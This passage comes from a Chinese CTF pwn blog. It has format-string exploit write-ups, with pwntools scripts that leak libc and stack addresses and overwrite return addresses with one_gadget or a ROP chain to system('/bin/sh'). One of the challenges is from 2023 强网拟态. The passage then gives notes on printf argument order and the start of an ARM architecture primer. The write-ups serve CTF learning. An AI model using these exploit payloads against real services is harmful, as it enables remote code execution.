class="number">0158</span>│     <span class="number">0x7fff7221d7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">2</span>c:<span class="number">0160</span>│     <span class="number">0x7fff7221d7b8</span> —▸ <span class="number">0x7fe104e33083</span> (__libc_start_main+<span class="number">243</span>) ◂— mov edi, eax</span><br></pre></td></tr></table></figure><p><code>2c:0160│</code>对应的参数偏移是48,于是%*48$c,打印0x7ffff7de6083宽度(有点哈人,幸好alarm给了600秒，而且还重定向了错误流)的字符出来</p><p>然后通过<code>16:00b0</code>%n改写<code>1a:00d0</code>为one_gadget</p><p>再然后就要考虑如何将返回流劫持到该处,发现程序会两次回栈,所以可以通过<code>03:0018│</code>修改<code>27:0138</code>处的rbp值,使第二次回栈的时候进入控制的流</p><p>于是<strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dev_null = <span class="built_in">open</span>(<span class="string">&quot;/dev/null&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./se&quot;</span>,stderr=dev_null)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your name: &quot;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;&#x27;&#x27;b fprintf</span></span><br><span class="line"><span class="string">b *$rebase(0x1335)&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&quot;%*48$c%801983c%26$n%221c%7$hhn\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your phone: &quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;yourself!&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;~.\n&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里还有最后一个槛,不算难但要发现着实有点困难</p><p>就是要在栈上构造出一个指向栈上的函数地址的栈,即出现<code>03:0018</code>这样的栈</p><p>正常来到fprintf并没有这样一个栈内存</p><p>不过很巧的是可以发现<code>16:00b0</code>处的值始终指向我们输入的字符的结尾</p><p>而在<code>1a:00d0</code>处有一个函数指针,所以如果刚好发送18个数字字符的话,就能获得一个满足要求的栈内存了</p><h2 id="dev-null"><a href="#dev-null" class="headerlink" title="/dev/null"></a>/dev/null</h2><p><code>/dev/null</code> 是一个特殊的设备文件，用于丢弃数据。在Unix-like系统中，<code>/dev/null</code> 表示空设备，写入它的数据会被丢弃，读取它则会立即得到一个文件结尾（End-of-File）。</p><h1 id="2023第六届强网拟态-fmt"><a href="#2023第六届强网拟态-fmt" class="headerlink" title="2023第六届强网拟态-fmt"></a>2023第六届强网拟态-fmt</h1><p><strong>标签:格式化字符串</strong></p><p>这题一个难点在于格式化字符串不在栈上</p><p>当然影响其实并不很大</p><p>首先程序会打印一个栈地址的最后两个字节</p><p>断在printf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fffffffde48</span> —▸ <span class="number">0x555555555250</span> (main+<span class="number">167</span>) ◂— mov edi, <span class="number">0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fffffffde50</span> —▸ <span class="number">0x7fffffffdf50</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7fffffffde58</span> ◂— <span class="number">0xafe57b979d2b8b00</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│ rbp <span class="number">0x7fffffffde60</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7fffffffde68</span> —▸ <span class="number">0x7ffff7de6083</span> (__libc_start_main+<span class="number">243</span>) ◂— mov edi, eax</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fffffffde70</span> ◂— <span class="number">0x50</span> <span class="comment">/* &#x27;P&#x27; */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7fffffffde78</span> —▸ <span class="number">0x7fffffffdf58</span> —▸ <span class="number">0x7fffffffe2aa</span> ◂— <span class="string">&#x27;/home/aichch/pwn/fmt&#x27;</span></span><br></pre></td></tr></table></figure><p>可以发现此时栈上有一个三级栈指针06:0030</p><p>那么先利用%n修改0x7fffffffe2aa为0x7fffffffe248,再利用%n修改0x555555555250为read的地址</p><p>就可以多次利用格式化字符串漏洞了</p><p>泄露,打one_gadget就能完成利用</p><p><strong>exp:(自己写的未完成但大致是这么个思路)</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./fmt&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(script):</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">p=process(elf_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stack=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">4</span>:],<span class="number">16</span>)-<span class="number">12</span></span><br><span class="line">leak(<span class="string">&quot;stack&quot;</span>,stack)</span><br><span class="line">dbg()</span><br><span class="line">payload=<span class="string">b&#x27;%p&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%hn&quot;</span>.<span class="built_in">format</span>(stack-<span class="number">90</span>).encode()</span><br><span class="line">written=stack&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">if</span> written&lt;=<span class="number">0x23</span>:</span><br><span class="line">n=<span class="number">0x23</span>-written</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">n=<span class="number">0x100</span>-written+<span class="number">0x23</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%39$hhn&quot;</span>.<span class="built_in">format</span>(n).encode()</span><br><span class="line">payload+=<span class="string">b&#x27;%9$p%13$p&#x27;</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">r(<span class="number">90</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span></span><br><span class="line">leak(<span class="string">&quot;libc&quot;</span>,libc.address)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">text=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x11a9</span></span><br><span class="line">leak(<span class="string">&quot;text:&quot;</span>,text)</span><br><span class="line"></span><br><span class="line">payload=</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>别人的<strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;/bin/tmux&quot;</span>,<span class="string">&quot;sp&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>(<span class="params">sh, data</span>):</span><br><span class="line">    data = data.ljust(<span class="number">0x100</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_data</span>(<span class="params">sh, atk_addr, write_data</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">x</span>):</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> target_addr <span class="keyword">in</span> <span class="built_in">range</span>(atk_addr, atk_addr + <span class="built_in">len</span>(write_data), <span class="number">2</span>):</span><br><span class="line">        idx = target_addr - atk_addr</span><br><span class="line">        part_data = u16(write_data[idx: idx + <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(main) + <span class="string">&quot;%39$hhn&quot;</span></span><br><span class="line">        payload += build((target_addr + <span class="number">0x10000</span> - main) &amp; <span class="number">0xFFFF</span>) + <span class="string">&quot;%27$hn&quot;</span></span><br><span class="line">        fmt(sh, payload)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(main) + <span class="string">&quot;%39$hhn&quot;</span></span><br><span class="line">        payload += build((part_data + <span class="number">0x10000</span> - main) &amp; <span class="number">0xFFFF</span>) + <span class="string">&quot;%41$hn&quot;</span></span><br><span class="line">        fmt(sh, payload)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x23</span></span><br><span class="line">retn = <span class="number">0xC4</span></span><br><span class="line"><span class="comment"># sh = process(&#x27;./fmt&#x27;)</span></span><br><span class="line">sh = remote(sys.argv[<span class="number">1</span>], <span class="number">9999</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Gift: &#x27;</span>)</span><br><span class="line">stack_ret = <span class="built_in">int</span>(sh.recvline(), <span class="number">16</span>) - <span class="number">0xC</span></span><br><span class="line">log.success(<span class="string">&quot;stack_ret:\t&quot;</span> + <span class="built_in">hex</span>(stack_ret))</span><br><span class="line"></span><br><span class="line">first = <span class="string">&quot;%c&quot;</span> * <span class="number">9</span></span><br><span class="line">first += <span class="string">&quot;%&#123;&#125;c%hn&quot;</span>.<span class="built_in">format</span>((stack_ret-<span class="number">9</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">first += <span class="string">&quot;%&#123;&#125;c%39$hhn&quot;</span>.<span class="built_in">format</span>((main - stack_ret) &amp; <span class="number">0xFF</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">fmt(sh, first)</span><br><span class="line"><span class="comment"># sh.interactive()</span></span><br><span class="line"></span><br><span class="line">fmt(sh, <span class="string">&quot;%&#123;&#125;c%39$hhn%9$p%11$p\n&quot;</span>.<span class="built_in">format</span>(main &amp; <span class="number">0xFF</span>))</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - <span class="number">0x24083</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:\t&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">stack = <span class="built_in">int</span>(sh.recvline(), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;stack:\t&quot;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">stack_rop = stack - <span class="number">0x108</span></span><br><span class="line">pop_rdi_addr = libc_base + <span class="number">0x23b6a</span></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1b45bd</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x52290</span></span><br><span class="line">write_data(sh, stack_rop, p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr))</span><br><span class="line">fmt(sh, <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(retn) + <span class="string">&quot;%39$hhn&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="printf的一个细节问题"><a href="#printf的一个细节问题" class="headerlink" title="printf的一个细节问题"></a>printf的一个细节问题</h2><p>看两段代码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%11$hn&quot;</span>.<span class="built_in">format</span>(stack).encode()</span><br><span class="line">written=stack&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">if</span> written&lt;=<span class="number">0x23</span>:</span><br><span class="line">n=<span class="number">0x23</span>-written</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">n=<span class="number">0x100</span>-written+<span class="number">0x23</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%39$hhn&quot;</span>.<span class="built_in">format</span>(n).encode()</span><br><span class="line">payload+=<span class="string">b&#x27;%9$p%13$p&#x27;</span></span><br><span class="line">s(payload)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;%p&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%hn&quot;</span>.<span class="built_in">format</span>(stack-<span class="number">90</span>).encode()</span><br><span class="line">written=stack&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">if</span> written&lt;=<span class="number">0x23</span>:</span><br><span class="line">n=<span class="number">0x23</span>-written</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">n=<span class="number">0x100</span>-written+<span class="number">0x23</span></span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%39$hhn&quot;</span>.<span class="built_in">format</span>(n).encode()</span><br><span class="line">payload+=<span class="string">b&#x27;%9$p%13$p&#x27;</span></span><br></pre></td></tr></table></figure><p>这两段代码的目的,都是两次连接修改来写printf的返回地址</p><p>且效果上看过去是一致的,但实际上第一段代码并不能按照预期工作,仅仅是修改了第一部分的指针，确实做出了一个指向 <code>printf</code> 返回地址的指针，但第二部分通过刚刚做出的指针并没有成功修改掉 <code>printf</code> 函数的返回地址</p><p>原理暂时不清楚,但得出的结论是,要像这样通过修改中间指针来指向修改某一个内存,连接过程不能两个都是用<code>$</code>写法,其中一个得是利用正常顺序排列得出</p><h3 id="非-格式化顺序"><a href="#非-格式化顺序" class="headerlink" title="非$格式化顺序"></a>非$格式化顺序</h3><p><strong>非$指定的%参数单独计数</strong>,按顺序对应各个参数</p><p>例如<code>printf(&quot;%d%2$d%d&quot;,1,2,3)</code></p><p>打印结果是122,即$不加入普通参数的记数</p><p>在本题中就选择以9个%p和1个%c填充,使得%hn对应相对格式化字符串的第11个参数</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见异架构基础</title>
      <link href="/posts/36717/"/>
      <url>/posts/36717/</url>
      
        <content type="html"><![CDATA[<h1 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h1><p>CTF比赛中，大部分题的都是x86、x86_64的程序，这类程序是属于Intel处理器支持的</p><p>   但其实，在生活中配置ARM处理器的设备要多得多，比如：Android、网络设备、智能家居等</p><p>Intel和ARM之间的区别主要是指令集</p><p>●CISC 复杂指令集</p><p>●RISC 精简指令集</p><p>   精简指令集通过减少每条指令的时钟周期来缩短执行时间，可以更快的执行指令，但因为指令较少，因此在实现功能时，会显得比Intel冗长</p><p>   其次，在x86上，大多数指令都可以直接对内存中的数据进行操作，而在ARM上，必须先将内存中的数据从内存移到寄存器中，然后再进行操作</p><hr><p>一般我们说的<code>arm</code>是<code>ARMv7</code>架构，是<code>32</code>位，而<code>aarch64</code>是<code>ARMv8</code>架构，也就是<code>64</code>位。</p><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><h3 id="ARM32"><a href="#ARM32" class="headerlink" title="ARM32"></a>ARM32</h3><p>寄存器的数量取决于ARM版本，ARM32有30个通用寄存器（基于ARMv6-M和基于ARMv7-M的处理器除外），前16个寄存器可在用户级模式下访问，其他寄存器可在特权软件执行中使用</p><p>其中，r0-15寄存器可在任何特权模式下访问。这16个寄存器可以分为两组：通用寄存器（R0-R11）和专用寄存器（R12-R15）</p><p><img src="https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png" alt=""></p><p><strong>普通寄存器</strong>R0-R12：可在常规操作期间用于存储临时值，指针（到存储器的位置）等，例如：</p><p>●<strong>R0</strong>在算术操作期间可称为累加器，或用于<strong>存储先前调用的函数的结果</strong></p><p>●<strong>R7</strong>在处理系统调用时非常有用，因为它<strong>存储系统调用号</strong></p><p>●<strong>R11</strong>帮助我们跟踪<strong>用作帧指针的堆栈的边界</strong></p><p>●ARM上的函数调用约定指定函数的前四个参数存储在寄存器<strong>r0</strong>-<strong>r3</strong>中</p><p><strong>特殊寄存器</strong></p><p><strong>R13</strong>：SP（堆栈指针）。堆栈指针指向堆栈的顶部。堆栈是用于函数特定存储的内存区域，函数返回时将对其进行回收。因此，通过从堆栈指针中减去我们要分配的值（以字节为单位），堆栈指针可用于在堆栈上分配空间。换句话说，如果我们要分配一个32位值，则从堆栈指针中减去4</p><p><strong>R14</strong>：LR（链接寄存器）。进行功能调用时，链接寄存器将使用一个内存地址进行更新，该内存地址引用了从其开始该功能的下一条指令。这样做可以使程序返回到“父”函数，该子函数在“子”函数完成后启动“子”函数调用</p><p><strong>R15</strong>：PC（程序计数器）。程序计数器自动增加执行指令的大小。在ARM状态下，此大小始终为4个字节，<strong>在THUMB模式下，此大小始终为2个字节。</strong>当执行转移指令时，PC保留目标地址。在执行期间，PC在ARM状态下存储当前指令的地址加8（<strong>两个ARM指令</strong>），在Thumb（v1）状态下存储当前指令的地址加4（<strong>两个Thumb指令</strong>）。这与x86不同，x86中PC始终指向要执行的下一条指令</p><p><strong>与x86平行对比</strong></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/asdasdasd1.png" alt=""></p><h4 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h4><p>1.当参数少于4个时，子程序间通过寄存器R0~R3来传递参数；当参数个数多于4个时，将多余的参数通过数据栈进行传递，入栈顺序与参数顺序正好相反,即从左到右，子程序返回前无需恢复R0~R3的值</p><p>2.在子程序中，使用R4~R11保存局部变量，<strong>若使用需要入栈保存</strong>，<strong>子程序返回前需要恢复这些寄存器</strong>；<u>R12是临时寄存器，使用不需要保存</u></p><p>3.R13用作数据帧指针，记作SP；R14用作链接寄存器，记作LR，<strong>用于保存子程序返回时的地址</strong>；R15是程序计数器，记作PC</p><p>4.ATPCS规定堆栈是满递减堆栈FD；</p><p>5.子程序返回32位的整数，使用R0返回；返回64位整数时，使用R0返回低位，R1返回高位</p><h3 id="AARCH64"><a href="#AARCH64" class="headerlink" title="AARCH64"></a>AARCH64</h3><p>AARCH64也即64位的ARM，从ARMv8开始才有。ARMv8分为aarch32和aarch64两部分。</p><p><img src="https://toleleyjl.github.io/images/%E5%BC%82%E6%9E%84Pwn/pic06.png" alt=""></p><p>aarch64有31个通用寄存器:X0-X30</p><p>低 32 位可以通过 W0-W30 来访问. 当写入 Wy 时, Xy 的高 32 位会被置 0。</p><p><img src="https://toleleyjl.github.io/images/%E5%BC%82%E6%9E%84Pwn/pic07.png" alt=""></p><p>AARCH64标准提供了8个通用寄存器（X0~X7）用于传递函数参数，依次对应于前8个函数参数。超过8个的参数使用堆栈进行参数传递。</p><p>函数的返回值用通用寄存器X0来保存。</p><h3 id="32与64位差异"><a href="#32与64位差异" class="headerlink" title="32与64位差异"></a>32与64位差异</h3><p>​    arm32下，前4个参数是通过r0~r3传递，第4个参数需要通过sp访问，第5个参数需要通过sp + 4 访问，第n个参数需要通过sp + 4*(n-4)访问。</p><p>​    arm64下，前8个参数是通过x0~x7传递，第8个参数需要通过sp访问，第9个参数需要通过sp + 8 访问，第n个参数需要通过sp + 8*(n-8)访问。</p><p>​    ARM指令在32位下和在64位下并不是完全一致的，但大部分指令是通用的，特别的，” mov r2, r1, lsl #2”仅在ARM32下支持，它等同于ARM64的” lsl r2, r1, #2”</p><p>​    还有一些32位存在的指令在64位下是不存在的，比如vswp指令，条件执行指令subgt,addle等</p><p>arm指令集</p><h2 id="ARM指令集"><a href="#ARM指令集" class="headerlink" title="ARM指令集"></a>ARM指令集</h2><p>ARM处理器具有两种可以运行的主要状态（此处不包括Jazelle）：<strong>ARM和Thumb</strong></p><p>​    这两种状态之间的主要区别是指令集，<strong>其中ARM状态下的指令始终为32位，Thumb状态下的指令始终为16位（但可以为32位）</strong></p><p>​    现在，ARM引入了增强的Thumb指令集（Thumbv2），该指令集允许32位Thumb指令甚至条件执行，而在此之前的版本中是不可能的，为了在Thumb状态下使用条件执行，引入了“ it”指令。但是，这个指令在后来的版本中被删除并替换成了其他的</p><p>​    在编写ARM shellcode时，我们需要摆脱NULL字节，并使用16位Thumb指令而不是32位ARM指令来减少使用它们的机会。</p><p><strong>Thumb和ARM一样也有不同的版本：</strong></p><p>●Thumb-1（16位指令）：在ARMv6和更早的体系结构中使用</p><p>●Thumb-2（16位和32位指令）：通过添加更多指令并使它们的宽度为16位或32位（ARMv6T2，ARMv7）来扩展Thumb-1</p><p>●ThumbEE：包括一些针对动态生成的代码的更改和添加</p><p><strong>ARM和Thumb之间的区别：</strong></p><p>●条件执行：ARM状态下的所有指令均支持条件执行。某些ARM处理器版本允许使用“it”指令在Thumb中有条件执行。</p><p>●32位ARM和Thumb指令：32位Thumb指令带有.w后缀。</p><p>●桶式移位器（barrel shifter）是ARM模式的另一个独特功能。它可以用于将多个指令缩小为一个。例如，您可以使用左移，而不是使用两条指令，将寄存器乘以2并使用mov将结果存储到另一个寄存器中：mov r1, r0, lsl #1 ; r1 = r0 * 2</p><p><strong>切换处理器执行的状态</strong></p><p>必须满足以下两个条件之一：</p><p>●我们可以使用分支指令BX（分支和交换）或BLX（分支，链接和交换）并将目标寄存器的最低有效位设置为1。这可以通过在偏移量上加上1来实现，例如0x5530 + 1。可能会认为这会导致对齐问题，因为指令是2字节或4字节对齐的。这不是问题，因为处理器将忽略最低有效位</p><p>●我们知道如果当前程序状态寄存器中的T位置1，则我们处于Thumb模式。</p><h3 id="ARM指令初识"><a href="#ARM指令初识" class="headerlink" title="ARM指令初识"></a>ARM指令初识</h3><p>汇编语言由指令构成，而指令是主要的构建块。ARM指令通常后跟一个或两个操作数，并且通常使用以下模板：</p><p>​    MNEMONIC {S} {condition} {Rd}，Operand1，Operand2</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/sadasd3.png" alt=""></p><p>​    注意，由于ARM指令集的灵活性，并非所有指令都使用模板中提供的所有字段。其中，条件字段与CPSR寄存器的值紧密相关，或者确切地说，与寄存器内特定位的值紧密相关</p><p>Operand2被称为灵活操作数，因为我们可以以多种形式使用它，例如，我们可以将这些表达式用作Operand2：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/213asda.png" alt=""></p><p>下面以一些常见指令为例：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/%E5%9B%BE%E7%89%875.png" alt=""></p><h4 id="ARM常用指令"><a href="#ARM常用指令" class="headerlink" title="ARM常用指令"></a>ARM常用指令</h4><div 